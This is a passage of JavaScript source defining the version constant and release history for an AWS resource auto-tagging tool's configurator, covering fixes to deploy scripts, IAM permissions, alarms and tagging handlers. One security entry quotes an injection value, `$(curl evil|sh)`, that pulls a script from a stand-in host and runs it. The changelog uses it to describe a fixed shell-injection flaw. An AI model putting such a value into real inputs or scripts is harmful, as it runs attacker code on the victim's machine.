        // Template version — single source of truth for the SemVer constant.
        // The deployable YAML and configurator.html are both generated from src/
        // (npm run build), so this constant flows into every artifact automatically.
        const TEMPLATE_VERSION = 'v22.1.0';

        // Version history surfaced in the Update flow. Bullets are intentionally English-only —
        // translating release notes across 7 languages for every PR is unsustainable. Labels
        // (titles, buttons) go through i18n; change bullets stay in source form.
        // Tags: bugfix, coverage, breaking, security, perf, other.
        // Keep the newest entry's version in sync with TEMPLATE_VERSION above.
        const VERSION_HISTORY = [
            {
                version: 'v22.1.0',
                date: '2026-07-19',
                changes: [
                    { tag: 'other', text: 'Centralized SNS alerting for multi-account deployments (PR #108): the org deployer creates one central alert topic per deployed region in the management account (auto-map-tagger-alerts-central-<mpe>) with a single email subscription — replacing one topic + confirmation email per account x region (150+ clicks for large orgs). Per-account alarms publish cross-account to the same-region central topic (CloudWatch alarm actions cannot cross regions). Topic publish grant is scoped to the customer organization via aws:SourceOrgID. Single-account deployments unchanged. New per-account CFN parameter CentralAlertAccountId (default empty = local topic).' },
                    { tag: 'bugfix', text: 'Local alert topic no longer encrypted with the AWS-managed SNS KMS key (CT6-003): that key cannot grant cloudwatch.amazonaws.com kms:GenerateDataKey, so every alarm action against the topic failed silently — alerts never reached subscribers in v21/v22.0.0. Existing deployments pick up the fix via upgrade.sh or redeploy.' },
                    { tag: 'bugfix', text: 'Resources whose tag call raced their own provisioning are no longer permanently untagged (PR #114): not-found errors within 10 minutes of the CloudTrail eventTime now classify transient and retry via SQS; older not-founds still ack as genuinely deleted. Closes the burst-create tag-loss class (7/100 DynamoDB tables in chaos testing).' },
                    { tag: 'bugfix', text: 'Broken day-2 SSM config no longer loses tags silently (CT6-005, PR #117): unreadable/unparseable config or missing mpe_id now retries and exhausts into the DLQ + alarm instead of acking — fix the config, redrive the DLQ, tags recover. Tagging stays fail-closed throughout.' },
                    { tag: 'bugfix', text: 'Org-mode v21→v22 migration can no longer silently deploy nothing (CT6-004, PR #118): deploy.sh refuses the swallowed "No updates are to be performed" no-op with exact remediation, a zero-instance StackSet after 20 min is a loud failure, and INSTRUCTIONS.md migration steps now include the admin-stack deletion.' },
                    { tag: 'bugfix', text: 'Preflight hardening: MPE IDs whose derived IAM role names would exceed 64 chars are rejected at validation with the per-region limit (CT6-006, PR #115); the competing-tagger check now sees StackSet-deployed peers (CT6-007, PR #115); CloudTrail coverage is verified per target account at deploy time (PR #112); the SCP check now works for role/SSO callers — it previously died silently on the STS session ARN, passing orgs whose SCPs deny tagging (PR #123).' },
                    { tag: 'bugfix', text: 'Backfill: the custom-resource Lambda now runs under an explicit time budget so long CloudTrail sweeps can never stall stack creation (PR #116), and deploy.sh\'s backfill wait no longer misses the completion sentinel and burns its full 1200s timeout (PR #121).' },
                    { tag: 'bugfix', text: 'delete.sh exits 0 on a fully successful delete with log deletion enabled (PR #120) — a trailing bare && list previously reported exit 1 to CI wrappers and automation. Delete-form first-row MPE input no longer truncates IDs longer than 10 chars (PR #113).' },
                    { tag: 'coverage', text: '13 tag-loss handler fixes from golden-event replay verification (Fargate/ECS standalone tasks, Glue/IoT alert-noise suppression, and 11 more), plus a coverage gate: all 158 handler branches are live-tagged, replayed from captured CloudTrail events, or ledgered with a reason — CI fails on any uncovered branch.' },
                    { tag: 'other', text: 'Certified by two full 36-phase release-gate runs (2026-07-18/19) with zero product blockers after triage.' },
                ],
            },
            {
                version: 'v22.0.0',
                date: '2026-06-12',
                changes: [
                    { tag: 'breaking', text: 'MAJOR: Source decoupling — the deployable YAML and configurator.html are now generated from modular src/ files via npm run build (PR #89). The hand-maintained map2-auto-tagger-optimized.yaml monolith is gone; CI fails any PR whose committed artifacts are stale (PR #91). Forks that patched the YAML directly must re-apply changes against src/.' },
                    { tag: 'breaking', text: 'Reconciliation Lambda removed (PR #95). The real-time tagger with SQS buffering (14-day retention, 5 retries) is the sole tagging path. DLQ events no longer self-heal — operators must redrive the DLQ after resolving the cause. Long-provisioning resources (notably AWS Managed Microsoft AD, 25-45 min) exhaust the 900s retry budget and require manual redrive; see LIMITATIONS.md.' },
                    { tag: 'breaking', text: 'Edit and Upgrade configurator flows disabled (PR #97) — Upgrade reset scoped_account_ids to ["ALL"] when upgrading from pre-v22 templates; Edit was incompatible with the new !Sub-based SSM config. Day-2 account add/remove is via CloudShell update-stack-set commands (INSTRUCTIONS.md); upgrades are delete-and-redeploy.' },
                    { tag: 'other', text: 'SSM MapConfig is now built from CFN parameters (ScopedAccountIds, ScopedVpcIds, TagNonVpcServices) via !Sub instead of baked JS template literals, so stack updates with UsePreviousValue preserve real customer scope (PR #95).' },
                    { tag: 'other', text: 'StackSet AutoDeployment is always enabled (PR #93) — accounts joining a scoped OU automatically receive the tagger. CloudFormation stacks themselves are no longer tagged (PR #92); CFN is not on the MAP Included Services List.' },
                    { tag: 'coverage', text: 'FSx for NetApp ONTAP volumes now tagged via CreateVolume event (PR #100). CloudFront CreateDistribution handler added (PR #96).' },
                    { tag: 'bugfix', text: 'Kinesis silent tag loss fixed (PR #102): AWS began emitting a malformed resources-array ARN on CreateStream events (stream name in the account field, null resource name) which the generic ARN scan trusted verbatim. New well-formedness gate rejects structurally invalid resources-array ARNs so they fall through to the dedicated per-service handlers.' },
                    { tag: 'bugfix', text: 'CT5 chaos-test fixes (PR #96): SSM config cache invalidated on fetch failure for immediate retry; delete-flow log-group guard for empty describe-log-groups; MpeId MaxLength raised 20 to 44 to match real MPE IDs (length validation removed across flows in PR #94); per-failure SNS alert flood replaced with CloudWatch Logs Insights query in the DLQ alarm description.' },
                ],
            },
            {
                version: 'v21.0.7',
                date: '2026-05-01',
                changes: [
                    { tag: 'bugfix', text: 'Remove explicit PreflightLogGroup CFN resource to prevent AlreadyExists error on StackSet cross-region redeploy. CloudWatch auto-creates the log group; eliminates the orphan race where the Custom Resource Delete handler writes logs after CFN deletes the explicit log group.' },
                    { tag: 'bugfix', text: 'Fix VPC-scope reconciliation scope leak and is_in_scope over-tagging. When vpc_id is unresolvable and tag_non_vpc_services is true, VPC-bound services (ec2, rds, elasticache, etc.) now return False instead of falling through. Prevents reconciliation from converting VPC scope into account scope on the nightly sweep.' },
                ],
            },
            {
                version: 'v21.0.6',
                date: '2026-04-29',
                changes: [
                    { tag: 'bugfix', text: 'AgreementEndDate enforcement — is_after_agreement() and reconciliation _in_agreement() now check both start AND end dates. Resources created after agreement end are no longer tagged (CT2 F036 / CT3 A3). YAML template adds AgreementEndDate parameter with Default 2099-12-31 for backwards compatibility.' },
                ],
            },
            {
                version: 'v21.0.4',
                date: '2026-04-28',
                changes: [
                    { tag: 'bugfix', text: 'Configurator validation: agreement dates now validated as real calendar dates (F034). MPE ID length check added — 1-44 chars (F031). update.sh detects single-account stacks and provides SSM instructions (F026). update.sh scope edit validated for JSON correctness (F017). deploy.sh warns before updating existing stacks (F041).' },
                ],
            },
            {
                version: 'v21.0.3',
                date: '2026-04-28',
                changes: [
                    { tag: 'bugfix', text: 'Peer detector now matches StackSet-deployed stacks (StackSet-map-auto-tagger-mig* prefix) in addition to direct stacks (F018). UPDATE_ROLLBACK_FAILED classified as permanent_ignorable instead of transient (F029). Control Tower managed rule tag attempts classified as permanent_ignorable (F030).' },
                ],
            },
            {
                version: 'v21.0.2',
                date: '2026-04-28',
                changes: [
                    { tag: 'bugfix', text: 'Shell script fixes: add_subscriber.sh SNS topic name corrected to auto-map-tagger-alerts (F010) + region precedence fixed (F044). delete.sh MPE regex relaxed to accept any-length alphanumeric (F024). deploy.sh bucket creation now checks region and fails if bucket exists in wrong region instead of silently failing (F043).' },
                ],
            },
            {
                version: 'v21.0.1',
                date: '2026-04-28',
                changes: [
                    { tag: 'bugfix', text: 'Multi-account deploy path unblocked: fixed scopedAccountIdsJson undefined in generateOrgTemplate (F007), RetainStacksOnAccountRemoval when AutoDeployment=false (F015), delete.sh now detects SERVICE_MANAGED StackSets and uses OrganizationalUnitIds instead of --accounts (F019).' },
                ],
            },
            {
                version: 'v21.0.0',
                date: '2026-04-28',
                changes: [
                    { tag: 'breaking', text: 'MAJOR: Configurator Lambda fully synced with YAML Lambda — 147 handlers (was 26). Customers must regenerate deploy.sh from the configurator for this to take effect. Closes F012 (configurator Lambda sync gap), F005 (template drift), F025 (36 silent-loss pairs), F027 (VPC scope fallthrough).' },
                    { tag: 'other', text: 'sync-check.py now enforces handler-count parity between YAML and configurator — prevents future F012-class regressions.' },
                ],
            },
            {
                version: 'v20.10.0',
                date: '2026-04-28',
                changes: [
                    { tag: 'feature', text: 'YAML Lambda now includes native tag dispatch for DSQL, VPC Lattice, Bedrock AgentCore, Payment Cryptography, and Network Manager — previously only in the configurator Lambda. Closes the back-port gap that blocked F012 (configurator Lambda sync).' },
                    { tag: 'bugfix', text: 'AD Connector (ConnectDirectory) now tagged. Added ConnectDirectory to the Directory Service handler and added "Connect" prefix to the EventBridge event pattern. Closes F006 (silent credit loss for AD Connector resources).' },
                ],
            },
            {
                version: 'v20.9.5',
                date: '2026-04-27',
                changes: [
                    { tag: 'perf', text: 'Native-API tag dispatch (S3, QuickSight, CloudFront, Route53, Kinesis, Firehose, APIGateway, AutoScaling, SQS, MemoryDB, DAX, StorageGateway, IoT, Keyspaces, CloudHSM v2, Directory Service, Bedrock Agent, Global Accelerator, KinesisVideo) now shares the 4-attempt exponential-backoff throttle retry (1s → 2s → 4s → 8s, ±25% jitter) previously only wired on the RGTA fallthrough. Short throttles are absorbed in-invocation instead of burning one of the 5 SQS redeliveries (180s VT each). THROTTLE_CODES is hoisted so both code paths share the same constant. (§1.81/§1.92)' },
                    { tag: 'security', text: 'Configurator review tables (editor/update/delete/deploy) now render customer-supplied values via textContent + document.createElement instead of innerHTML template literals. Closes the self-XSS surface where a customer-typed name, email, or VPC ID that somehow bypasses the input regex could inject an HTML/JS payload into the review pane. (§1.94)' },
                ],
            },
            {
                version: 'v20.9.4',
                date: '2026-04-27',
                changes: [
                    { tag: 'bugfix', text: 'CloudHSM v2 handler now matches the real CloudTrail eventSource `cloudhsm.amazonaws.com` (not `cloudhsmv2.amazonaws.com`). Clusters and HSMs created via the CloudHSM v2 API were never tagged before — live-confirmed 2026-04-27 on 586009411781. The boto3 client name is still `cloudhsmv2`; only the CloudTrail eventSource differs. (§1.99b)' },
                    { tag: 'bugfix', text: 'NAT Gateway ARN extraction now unwraps `CreateNatGatewayResponse` the same way the other EC2 handlers (NetworkAcl, LaunchTemplate, TransitGateway, VpnGateway, RouteTable) do. Prior handler tried top-level keys only and missed the wrapped shape. (§1.50)' },
                    { tag: 'bugfix', text: 'Added `batch:TagResource` to the Lambda IAM policy. AWS Batch job queues, compute environments, and job definitions were silently AccessDenied by RGTA dispatch — the service-authorization matrix requires the per-service action. (§1.27)' },
                    { tag: 'bugfix', text: 'Classifier now treats ElastiCache "is either not present or not available" (provisioning race) and SSM "concurrently modified" (ConcurrentUpdateException during parallel PutParameter bursts) as TRANSIENT. Prior behavior routed both to permanent_actionable → false SNS alerts on retry-eligible failures. (§1.101, §1.44)' },
                    { tag: 'coverage', text: 'Removed the false CloudFormation claim from docs/COVERAGE.md. CloudFormation is NOT on the MAP Included Services List (6 April 2026 edition); stack resources do not earn MAP credit. The IAM actions `cloudformation:TagResource / UpdateStack / UpdateStackSet / ListStacks` stay — they are used for internal CFN TagResource routing and peer-tagger detection, not for customer-visible CFN tagging. (§1.100)' },
                ],
            },
            {
                version: 'v20.9.3',
                date: '2026-04-26',
                changes: [
                    { tag: 'other', text: 'New CloudWatch alarm TrickleFailureAlarm catches slow-rate permanent_actionable tagging failures that the existing per-minute TaggerErrorAlarm misses. Fires when ≥6 of the last 24 hourly buckets each contain ≥1 TagFailureByClass{ErrorClass=permanent_actionable} datapoint — catches a trickle (e.g. one failure/hour for 6+ hours indicating IAM drift or a new resource type the classifier does not handle) while ignoring one-off transients.' },
                    { tag: 'bugfix', text: 'RunInstances volume resolution now fails fast on InvalidInstanceID.Malformed instead of burning the 30s describe_instances retry budget. The error propagates through _process_event, the classifier routes it to permanent_actionable, and an SNS alert fires — malformed instance IDs never resolve on retry and should not silently eat the whole Lambda budget. InvalidInstanceID.NotFound is unchanged (stays in PERMANENT_IGNORABLE_MARKERS — instance may still be materializing).' },
                    { tag: 'other', text: 'Removed dead duplicate Glue CreateTable branch in extract_arn — the first occurrence (above the resources-array scan) already returned the table ARN, so the later elif was unreachable dead code.' },
                ],
            },
            {
                version: 'v20.9.2',
                date: '2026-04-26',
                changes: [
                    { tag: 'bugfix', text: 'get_config() now wraps ssm.get_parameter and JSON parse in try/except. On SSM failure it logs CONFIG_UNREACHABLE and returns a safe-default config with mpe_id=None; is_in_scope() hard-rejects that state, so nothing tags until the next TTL refresh succeeds. Prior behavior let one transient SSM hiccup DLQ an entire burst.' },
                    { tag: 'bugfix', text: 'Whitespace stripped from every element of scoped_account_ids and scoped_vpc_ids at config parse time; empty elements dropped. CFN CommaDelimitedList strips on deploy, but SSM-stored config may carry customer-edit whitespace.' },
                    { tag: 'bugfix', text: 'is_in_scope() now fails closed at the scope-decision entry point: if config.mpe_id is falsy, return False (§1.3 defense-in-depth).' },
                    { tag: 'bugfix', text: 'is_in_scope() cross-checks agreement_start_date via datetime.strptime and logs CONFIG_INVALID_AGREEMENT_DATE on failure (§1.129 class: 2026-02-31 passes the CFN regex but fails strptime).' },
                    { tag: 'security', text: 'MpeId CFN parameter now has MaxLength: 20. The ^mig[a-zA-Z0-9]+$ pattern had no length cap; real MPE IDs are mig + 10–13 chars, so 20 is well above real usage and prevents an absurdly long ID from leaking into log group names or SSM parameter paths.' },
                ],
            },
            {
                version: 'v20.9.1',
                date: '2026-04-26',
                changes: [
                    { tag: 'bugfix', text: 'Expanded TRANSIENT_MARKERS so the three-path classifier retries S3 OperationAborted (409 conflicting conditional operation — concurrent CreateBucket/PutBucketTagging), EC2 SnapshotCreationPerVolumeRateExceeded (per-volume snapshot rate ceiling hit by burst backup/DR workloads), and the Throttling.User variant (EC2/STS emit this distinct from plain Throttling). Prior behavior routed all three to permanent_actionable → false SNS alerts during normal burst conditions that resolve on SQS redelivery.' },
                    { tag: 'bugfix', text: 'Bedrock system-defined inference profiles added to PERMANENT_IGNORABLE_MARKERS. CreateInferenceProfile fires for both application profiles (taggable — tag normally) and system-defined profiles (tag API returns "System-defined Inference Profile is not taggable"). Silently ack the system ones via CW metric while continuing to tag application profiles from the same event — CreateInferenceProfile is NOT added to IGNORE_EVENTS, which would skip both.' },
                ],
            },
            {
                version: 'v20.9.0',
                date: '2026-04-26',
                changes: [
                    { tag: 'bugfix', text: 'CFN Custom Resource preflight blocks peer-tagger scope collisions at stack-instance creation time. The configurator\'s deploy.sh preflight catches conflicts for deploys that run deploy.sh, but StackSet AutoDeployment into a newly-joined OU account provisions the stack instance directly — deploy.sh never runs, so a peer tagger in that account was previously only surfaced via the runtime PeerTaggerDetectedAlarm (PR #60), after the collision had already started. New PreflightFunction + Custom::PeerTaggerPreflight resource run before AutoTaggerFunction is created; on detected overlap they FAIL the Custom Resource → CFN rolls back the stack instance → no tagger is ever provisioned in the contaminated account. Fail-open on any internal error (throttle / IAM propagation / region issue) so legitimate deploys are never blocked by transient AWS conditions. Closes §1.108 temporal race.' },
                    { tag: 'other', text: 'Customer-facing support contract codified in docs/LIMITATIONS.md: the supported deployment path is configurator.html → deploy.sh. Running aws cloudformation create-stack against the raw YAML directly skips all preflight checks and is unsupported; bugs reproducible only via direct-YAML usage will be closed with a request to reproduce through the configurator.' },
                ],
            },
            {
                version: 'v20.8.1',
                date: '2026-04-26',
                changes: [
                    { tag: 'bugfix', text: 'Directory Service MS AD and Simple AD no longer generate false SNS alerts during directory provisioning. Directories stay in "Creating" state for 5–10 min (Simple AD) or 25–45 min (MS AD); tagging during that window returns "not supported for directories in this state. Directory Status: Creating", which the three-path classifier was routing to permanent_actionable → SNS alert on every AD creation. Added both phrases to TRANSIENT_MARKERS so Simple AD retries succeed within the 900s SQS budget; MS AD retries exhaust into EventDLQ without false alert noise, and the ReconciliationFunction catches the tag on the next nightly sweep (§1.98).' },
                ],
            },
            {
                version: 'v20.8.0',
                date: '2026-04-26',
                changes: [
                    { tag: 'perf', text: 'Lambda SQS event source mapping BatchSize raised 1 → 10 + FunctionResponseTypes=[ReportBatchItemFailures]. Phase 16 measured per-Lambda drain rate at 1.3 msg/s; a 15K-resource burst produced a 2.8-hour backlog. With batching each invocation drains up to 10 messages and only failed records are redelivered — drain rate rises ~10× while retry semantics per record are preserved. Closes §1.123, §1.124, §1.125, §1.131.' },
                    { tag: 'other', text: 'Runtime peer-tagger detection at Lambda cold-start. Lists map-auto-tagger-mig* stacks in this account/region and emits MapAutoTagger/PeerTaggerDetected + SNS alert via PeerTaggerDetectedAlarm when peers are found. Configurator\'s Class-2 preflight catches overlap at deploy.sh runtime, but StackSet AutoDeployment into new OU accounts bypasses deploy.sh entirely — Phase 16 Test 5 confirmed 0/50 resources got the intended MPE in that case. Detector doesn\'t prevent contamination (architectural routing fix is plan-PR #59); it surfaces it so customers find out from a CloudWatch alarm, not a MAP finance audit. Partial §1.108.' },
                    { tag: 'other', text: 'New Layer 1 regression guard batchsize-floor ensures EventQueueMapping.BatchSize stays ≥ 10 and ReportBatchItemFailures remains set. Catches silent reverts that our 50-resource E2E can\'t stress.' },
                ],
            },
            {
                version: 'v20.7.3',
                date: '2026-04-26',
                changes: [
                    { tag: 'bugfix', text: 'CloudWatch Dashboard PutDashboard ARN now has empty region (arn:aws:cloudwatch::ACCT:dashboard/NAME) per AWS IAM Service Authorization Reference. Prior handler emitted arn:aws:cloudwatch:REGION:… which RGTA rejected on every PutDashboard event (§1.83).' },
                    { tag: 'coverage', text: 'New EnableSecurityHub handler: response is null, so construct arn:aws:securityhub:REGION:ACCT:hub/default directly. Hub is always named "default" per AWS docs (§1.84).' },
                    { tag: 'coverage', text: 'New ActivateGateway handler for AWS Storage Gateway + native dispatch in tag_resource. GatewayARN field name caught by suffix-match in extract_arn (PR #43a), but RGTA does not support Storage Gateway — native storagegateway.add_tags_to_resource required (§1.85).' },
                    { tag: 'bugfix', text: 'DAX native dispatch added to tag_resource. Response extraction already worked but RGTA does not support DAX — every CreateCluster event fell to RGTA and AccessDenied silently. Native dax.tag_resource(ResourceName=arn, …) dispatch (§1.84).' },
                    { tag: 'bugfix', text: 'CreateHttpNamespace (Service Discovery) and PutQueryDefinition (CW Logs Insights) moved to IGNORE_EVENTS. CreateHttpNamespace returns only operationId (would need async polling that exceeds SQS 180s VT); PutQueryDefinition ARN shape is rejected by RGTA + native (not taggable per AWS). Prior dead handlers generated SNS noise. Closes §1.86, §1.87.' },
                ],
            },
            {
                version: 'v20.7.2',
                date: '2026-04-26',
                changes: [
                    { tag: 'bugfix', text: 'Added vpc-lattice:TagResource to the Lambda IAM policy. COVERAGE.md claimed VPC Lattice was supported via RGTA fallthrough, but without the per-service TagResource grant every CreateServiceNetwork event AccessDenied\'d silently (D7).' },
                    { tag: 'bugfix', text: 'CreateApiKey added to IGNORE_EVENTS (dead handler removed). API Gateway API Key ARN shape is rejected by all tagging APIs per MAP_TAGGING_GAP_ANALYSIS.md; prior handler constructed an ARN that RGTA + native both refuse — generated SNS alarm noise on every CreateApiKey event (D11).' },
                    { tag: 'bugfix', text: 'Sync-check IAM-action regex now allows hyphens in the service prefix (vpc-lattice, resource-explorer-2, sms-voice). Prior regex [\\w]+:[\\w]+ silently skipped 11 hyphenated actions in the configurator TAGGING_PERMISSIONS list — bug in sync-check itself, not the catalog.' },
                    { tag: 'other', text: 'Documentation cleanup (plan-PR #56 D7-D13): OVERVIEW.md Bedrock claim no longer lists AgentCore (ghost claim, no handler). OVERVIEW.md cost table adds SQS + SNS rows. CHANGELOG v20.3.0 gets a retraction note documenting the §1.98/§1.99 Tier 1 live bugs shipped at that version and fixed in v20.5.1/v20.6.4. INSTRUCTIONS.md upgrade section documents the dual-Lambda concurrent-tagging window when migrating from pre-v19.' },
                ],
            },
            {
                version: 'v20.7.1',
                date: '2026-04-26',
                changes: [
                    { tag: 'bugfix', text: 'Handler case-sensitivity fixes via new ci_get() helper. CloudTrail emits camelCase field names for some older services (Kendra CreateIndex response: "id" not "Id", §1.97; Redshift CreateCluster: "clusterIdentifier" with variant casing, §1.91; Elastic Beanstalk CreateApplication nested at "application.applicationName" not "Application.ApplicationName", §1.103). Prior handlers assumed boto3 SDK PascalCase shape → silent miss. ci_get() does case-insensitive dict lookup with exact-match priority. Also applied to SageMaker CreateDomain/CreatePipeline/CreateFeatureGroup handlers (pre-existing hand-coded or-chains simplified). Only applied to responseElements/requestParameters reads; not to internal dict keys.' },
                ],
            },
            {
                version: 'v20.7.0',
                date: '2026-04-26',
                changes: [
                    { tag: 'coverage', text: 'Added suffix-match fallback to extract_arn (both Lambda template and configurator inline). The hand-curated ARN_FIELDS allowlist was missing ~46 ARN key names across newer/less-common services (AppRunner ServiceArn, Batch jobQueueArn, ImageBuilder imagePipelineArn, Pinpoint PhoneNumberArn, etc.) — every miss was a silent credit loss. Fallback catches any responseElements key ending in Arn/ARN/arn whose value starts with "arn:" AND whose ARN service segment matches the event source (or a known alias like bedrock→bedrock-agent, kinesis→firehose). Allowlist remains Tier-1; fallback is additive, runs only when allowlist misses. Closes §1.31, §1.35, §1.56, §1.57, §1.61, §1.63, §1.65, §1.66, §1.67, §1.68 and ~35 other silent-miss service classes.' },
                ],
            },
            {
                version: 'v20.6.5',
                date: '2026-04-26',
                changes: [
                    { tag: 'bugfix', text: 'MapConfig SSM parameter now uses Tier: Intelligent-Tiering instead of the default Standard tier. Customers with ~240+ accounts in scoped_account_ids generate a Value > 4KB (the Standard-tier limit); prior behavior silently failed stack create with ParameterMaxSizeExceeded. Intelligent-Tiering stays free for normal-sized deployments and auto-upgrades to Advanced ($0.05/parameter/month) only when the Value actually crosses the threshold. Closes §1.60.' },
                ],
            },
            {
                version: 'v20.6.4',
                date: '2026-04-26',
                changes: [
                    { tag: 'bugfix', text: 'Added cassandra:Alter to the Lambda IAM policy. Keyspaces TagResource requires both cassandra:TagResource AND cassandra:Alter per the AWS IAM Service Authorization Reference — v20.3.0 shipped with only TagResource, causing AccessDenied on every Keyspaces tagging attempt (§1.99). Live-confirmed Tier 1 MAP service bug.' },
                    { tag: 'other', text: 'New Layer 1 CI check "IAM Completeness (native-dispatch)": parses boto3.client()/get_service_client() calls from the Lambda source, derives required IAM actions from a hand-curated service-authorization map, and fails the build if the canonical tagging-permissions list is missing any. Prevents future §1.99-class bugs where a new native-dispatch handler ships without the matching IAM grant.' },
                ],
            },
            {
                version: 'v20.6.3',
                date: '2026-04-26',
                changes: [
                    { tag: 'bugfix', text: 'Multi-account deploy.sh now defines REGIONS in its header. The preflight loop iterated over $REGIONS (plural) but only $REGION (singular) was ever set, so the stack-state preflight loop silently ran zero iterations in multi-account mode — customers could deploy on top of a stale *_IN_PROGRESS or ROLLBACK_COMPLETE stack without warning.' },
                    { tag: 'bugfix', text: 'Multi-account deploy.sh DEPLOY_STATUS guard changed from [ -z "$DEPLOY_STATUS" ] to [ "$DEPLOY_STATUS" = "NOT STARTED" ]. The -z guard was always false because DEPLOY_STATUS is initialized non-empty at the top of the script, so the entire StackSet-instance wait block (1200s poll for per-account rollout) was unreachable dead code. On success, DEPLOY_STATUS stayed "NOT STARTED" and the backfill-wait block (which gates on == "SUCCESS") never ran.' },
                    { tag: 'bugfix', text: 'PREFLIGHT_LOG printed via printf \'%b\' "$PREFLIGHT_LOG" instead of printf "$PREFLIGHT_LOG" — prevents % characters in AWS API output from being interpreted as printf format specifiers. %b preserves \\n → newline interpretation.' },
                    { tag: 'bugfix', text: 'Backfill wait no longer polls a nonexistent EventBridge rule. Prior code gated the CloudWatch Logs poll on aws events describe-rule --name map-auto-tagger-backfill-$MPE returning DISABLED, but backfill is a Custom::Backfill CustomResource (one-shot during stack create), not an EventBridge rule. Every deploy with backfill enabled silently hit the 1200s timeout before any log poll ran; customers saw the "Backfill is still running" message even when backfill had completed in seconds.' },
                ],
            },
            {
                version: 'v20.6.2',
                date: '2026-04-25',
                changes: [
                    { tag: 'bugfix', text: 'Backfill Lambda lookup_events retry now also matches the "ThrottledException" variant (with "ed"), not just "ThrottlingException" (with "ing"). CloudTrail normally throws the "ing" form but the "ed" variant has been observed in this path — same class as PR #17 fix for the main Lambda. Defensive symmetry across both variants.' },
                    { tag: 'bugfix', text: 'Backfill CFN Custom Resource now reports the real outcome in the Reason field. Prior behavior: always "Backfill: N sent, 0 errors" even when half the ~140 event types silently failed CloudTrail lookup after 4-retry exhaustion. New Reason: "Backfill: {sent} sent, {send_errors} send errors, {lookup_errors}/{N} event types failed lookup" — visible in CloudFormation event history. Still reports SUCCESS so stack create does not block on transient CloudTrail throttles (live tagging is unaffected by backfill failure).' },
                ],
            },
            {
                version: 'v20.6.1',
                date: '2026-04-25',
                changes: [
                    { tag: 'bugfix', text: 'Editor-mode update.sh generator: every aws CLI call now has explicit --region "$REGION". Customers running the script with AWS_DEFAULT_REGION unset or set to a different region no longer deploy into the wrong region or fail on cross-region StackSet lookup.' },
                    { tag: 'bugfix', text: 'Editor-mode update.sh now reads the current template via describe-stack-set --query StackSet.TemplateBody instead of downloading the deprecated S3 staging copy (auto-map-tagger-<acct>/map-auto-tagger-accounts-<mpe>.yaml). The staging object was only created during the initial multi-account deploy and could be missing / stale / garbage-collected — this eliminates the S3 dependency entirely.' },
                    { tag: 'bugfix', text: 'Upgrade-mode compare_versions now strict-validates three-part numeric SemVer (vMAJOR.MINOR.PATCH) and returns "error" on unparseable input instead of silently falling through to "patch". Prior behavior misclassified e.g. v21.0.6-rc1 → v20.3.0 as patch; upgrade_one caller now fails closed and directs the operator to --force.' },
                ],
            },
            {
                version: 'v20.6.0',
                date: '2026-04-25',
                changes: [
                    { tag: 'other', text: 'New configurator mode: Delete existing deployment → generates delete.sh that auto-detects single-account Stacks and multi-account StackSets matching map-auto-tagger-mig*, deletes them, and conditionally removes the S3 staging bucket (kept if any other deployments remain in the account). Optional opt-in to also delete CloudWatch Log Groups. Preserves map-migrated tags on AWS resources (MAP credits remain intact) and StackSet admin/execution IAM roles (shared org scaffolding). Confirmation: type DELETE. MPE ID input mirrors Editor/Update — auto-uppercase and enforced 10-char [A–Z0–9] format with invalid-row highlighting. Full i18n parity across all 7 languages (labels, error messages, review table, and the downloadable instructions preview all re-render on language switch). Idempotent — safe to re-run.' },
                ],
            },
            {
                version: 'v20.5.4',
                date: '2026-04-25',
                changes: [
                    { tag: 'other', text: 'Configurator Upgrade-mode generator now outputs upgrade.sh (was update.sh). The Editor-mode day-2 account-scope flow continues to output update.sh. The two scripts had the same filename; customers running both flows got colliding downloads with no way to tell which was which.' },
                ],
            },
            {
                version: 'v20.5.3',
                date: '2026-04-25',
                changes: [
                    { tag: 'bugfix', text: 'Fix generated upgrade-flow script — previously used --use-previous-parameters, a flag that does not exist on AWS CLI v2 update-stack or update-stack-set. Every customer upgrade attempt failed with "Unknown options: --use-previous-parameters". Replaced with per-parameter UsePreviousValue=true list built dynamically from each stack\'s existing parameters so newly-added template parameters (e.g. ReconciliationInterval) pick up the new template\'s Default. (Upgrade-flow output was renamed to upgrade.sh in v20.5.4.)' },
                ],
            },
            {
                version: 'v20.5.2',
                date: '2026-04-25',
                changes: [
                    { tag: 'security', text: 'Generated deploy.sh now contains customer-name input inside single-quoted shell strings (previously double-quoted). Fixes a supply-chain RCE where a partner-supplied customer name like `Acme $(curl evil|sh) Corp` would execute on the customer\'s CloudShell with AdministratorAccess. Re-download deploy.sh from the configurator before next deploy.' },
                    { tag: 'other',    text: 'New Layer 1 CI check (Shell Injection Guard) fails the build if the generator reintroduces the unsafe shape.' },
                ],
            },
            {
                version: 'v20.5.1',
                date: '2026-04-25',
                changes: [
                    { tag: 'bugfix',   text: 'Config SSM cache now has a 60-second TTL — warm containers no longer misattribute credit for up to 15 minutes after an MPE rotation.' },
                    { tag: 'bugfix',   text: 'Added events:TagResource IAM permission. Previously EventBridge rules / buses / schedules / connections AccessDenied on tag (IoT Events\' iotevents:TagResource is a different service).' },
                    { tag: 'bugfix',   text: 'CFN Output ConfigParameter now returns the real SSM parameter path (/auto-map-tagger/<mpe>/config) instead of the literal string /auto-map-tagger/config.' },
                ],
            },
            {
                version: 'v20.5.0',
                date: '2026-04-24',
                changes: [
                    { tag: 'other',    text: 'Reconciliation Lambda — daily safety-net that enumerates in-scope resources via Resource Groups Tagging API and re-enqueues any whose map-migrated tag is missing or wrong-MPE, routed through the live Lambda\'s three-path classifier for the actual tag write.' },
                    { tag: 'other',    text: 'New CloudWatch metrics in MapAutoTagger namespace: ReconciliationResourcesScanned, ReconciliationMissingTag, WrongMpeCorrected (dims ExpectedMpe + FoundMpe), ReconciliationTimeoutCanary (fires at 13 min elapsed).' },
                    { tag: 'other',    text: 'New CFN parameter ReconciliationInterval (default rate(24 hours)) — customer can tighten catch-up cadence if desired.' },
                ],
            },
            {
                version: 'v20.4.0',
                date: '2026-04-24',
                changes: [
                    { tag: 'bugfix',   text: 'Three-path error classifier: transient errors retry via SQS, permanent-ignorable (resource deleted between create and tag) silent-ack without alerting, permanent-actionable (tag quota, SCP drift, unknown) alert + route to EventDLQ. Reduces false-positive SNS noise and ensures actionable failures surface.' },
                    { tag: 'other',    text: 'TagFailureByClass CloudWatch metric (namespace MapAutoTagger) dimensions ErrorClass + MpeId — triage which error class drove a given failure without parsing log messages.' },
                    { tag: 'other',    text: 'Configurator now warns loudly (red banner) if Alert email is blank on deploy. Deploy still permitted — tagging failures just go un-alerted until a subscriber is added via scripts/add_subscriber.sh or the configurator update flow.' },
                ],
            },
            {
                version: 'v20.3.0',
                date: '2026-04-22',
                changes: [
